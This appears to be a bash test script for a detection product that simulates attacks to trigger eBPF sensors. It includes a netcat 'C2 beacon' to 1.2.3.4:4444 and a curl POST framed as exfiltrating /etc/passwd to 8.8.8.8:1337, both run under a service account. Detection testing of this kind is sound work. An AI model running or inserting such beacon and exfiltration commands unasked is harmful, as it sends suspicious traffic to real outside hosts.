#!/bin/bash
# AEGIS SAFE THREAT SIMULATOR
# Run this on your host machine to trigger the eBPF sensors safely.

echo "=========================================="
echo "    AEGIS APT SIMULATOR (SAFE MODE)       "
echo "=========================================="
echo "This script safely triggers the eBPF sensors to demonstrate AI detection."

# Ensure the script is run as root so we can spoof UIDs
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (sudo ./mock_apt.sh) so we can simulate compromised service accounts."
  exit
fi

while true; do
  echo -e "\nSelect Mock Attack:"
  echo "1) Simulate Safe Developer Activity (Should be ignored/scored low)"
  echo "2) Simulate Web-Server Compromise (DEFCON 1 Honeypod Trigger)"
  echo "3) Simulate Data Exfiltration (DEFCON 1 Honeypod Trigger)"
  echo "4) Exit"
  read -p "Selection: " choice

case $choice in
    1)
      echo "[*] Developer pinging standard HTTP port..."
      sudo -u $SUDO_USER curl --max-time 2 -s -I http://example.com | head -n 1
      ;;
    2)
      echo "[!] ALERT: Compromised 'daemon' account attempting C2 Beacon..."
      # Added -w 1 (1 second timeout) and & (run in background)
      sudo -u daemon nc -w 1 1.2.3.4 4444 &
      ;;
    3)
      echo "[!] ALERT: 'www-data' attempting to exfiltrate /etc/passwd..."
      # Added --max-time 2 and & (run in background)
      sudo -u daemon curl --max-time 2 -s -X POST -d "stolen_data=true" http://8.8.8.8:1337 &
      ;;
    4) exit 0 ;;
  esac
done
